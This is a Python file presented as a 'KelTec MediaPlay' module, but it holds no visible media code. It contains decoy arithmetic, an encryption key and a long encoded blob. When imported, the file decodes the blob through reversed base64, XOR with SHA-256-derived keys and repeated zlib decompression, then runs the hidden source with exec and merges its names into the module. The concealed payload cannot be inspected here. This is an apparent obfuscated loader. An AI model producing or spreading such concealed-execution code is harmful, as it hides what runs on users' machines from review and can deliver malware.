# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 811650 ^ 130486
_lx1_1 = len("603e23")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-184188)
_lx3_3 = 253584 * 0
_lx4_4 = 270431 ^ 294351
_K = '33c637d72628fbc4dc3080022cb56235aa015fa1598aa1c6bb17dc63ec4c7b02'
_M = 'ornq+iD0KThKTg=='
_D = 'fnCr+AUm5XJk9v5E85OK3ACgIQg7+GRMAQ/OlWSDEXOIJtlrV+CV1/kcT/1OLlkgCDTHOlbu0fQ2iL052duSS3Zgb42aBui2c5ztxCUbKCijTRVlCqO7rGBd7KSQYckNptpYl1qW60/2Ufg8YlePQGuSQhNSokOutGOB6A1seS/gaKICV+MW4AAV0dP5oXZcMSEOBgEtxnQlP7ReHxMm9rEM1x5Cm7HxNycdVPaYjbmzmpzJj8Jx2epVpAhEBOkdtzqnM1edDP1ZmSKXJ70FgLJ2HCWRZRQnywkdaH2K45Tqljlmn3RSQIEGMspsB02/vVYqcx/fGs46OSURB2E+pCXdZYCPxIgGnEIMTOgS1kXG/+TrBrfE5CbkXQUefbFsKDXuxqkTqYleYIgylnWtXowSY5rnlY+eOlj0OQCEpjxDR6D58rd4eTVOXasHyCPgkKTRcA+NdKsbXuKc3dUCBz0YzBY48Az8sgI34S7vDb5mWyRyPY2OPPzc2jId6P+RKHHB9h3LiEKbd9cGaATX5YBN0HufzkmQmkjdEx2BN4HCBUL10nGv5C0l6EwnV36OGbQin3SFVEWqys8t5mY6bhSOOtFAv3z9tT2RBo3S/ZgT8sh9RCxMEKxy1mQnFXxPKYMXn6Zzs5F839ctIQaU6+YryA7hLb1COusz49beRbJTMx0eG70gbw2OOpyoJdG7JdZT3hPy2vfA64fjrL2feUi5hM61C9mhWaroni6jh085CMLvckj7rrtmedVLun/YEXk0lgBuMa9eji5dHPZRt8RkU1qvH1fWCwDCTh/xBaHD5LxS/XPvClfNUSusLm3fDk0Lr4agychK+PHgMe4czGgHKTxTQf0XVzxO+s55ctwdZYYaxRDxQg5K0xzxukDBFcrWQJCa0p6jMRehAsPYpaSEZcn1Oz4vppGVn8SBcgb6sjyUZANf4OHa0Mmm9gYgfV7siXwQZg2+kkWbhTGLD/ebrL+Rf1sWjUf4SGJ1xdnRf1plaRTlDHw2P6KWY8sZr9osFG9d7J14ahYZgWtit7CnyDraLyAgvzzgn6oLZ0QPvIvBq0eJtoTJboyf0Ujqc2sO4YRXnJxXDQidq58RkKdrfeH7RgqJGdQSV6zkoIobL8Iv6BLAHwbdq9p5QX8ntyC0+5RtIe6qheUfTWaRlZFM38czeTtl7++UeLZH2NtQkIUuaMsn8Yy9k81L7gxljrg4EF/MUylOcrdKkkTonZ33HaNFgtc23qhYkWeD9R2ashZI2bnugl3Y0OG70rA0j2Lda3UaI5INBlImlkWteqz6qj0m0llI7p/iBVlj1qOAIBVbJUx/5OPjfENe+U0C/x7JHfCiU1BtfizfZRlhPBYcTlnGz5af1b++pgjicj2pYJnV1Aj65hVxZfQDggy+gvaTVODqGLs2YV7GLI6Gkc8IYYmH5Rz3RJr4AlCinCP6zV3fxAwj0aBVZUSP+TRZI0HWcT9ASjScTUqrUGxIg+fco9rmXZAHHR9ffkmIntzH6cTNk+rPGF07pYCla3iFZmkPBmkXBp4QOu0ws/nHicr2aidhh9znzvBalZZwRpcM9aWkl3rgly9Lmuavptlo5d3/mIhOleWBBtBj9wAMfBthrS9I3fmhZ7x5rj1s0lDL4OB5X/VCvoK/szRI709Fr8feyEO5c8dl+CZmtavTneyOBs3C4XZARYOrLsRuOY+sB6s3BMkG1t+ZhlHQsC6C8o1mGifu4SaVnT8N5k40pAabXq6kURBEC3MS9igo5NOhL8ekzO72Yt0OF7YsZNCq95unntKkBvdSHfXsMFQDl3VaN8ypU1I8vS6FmUdy'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
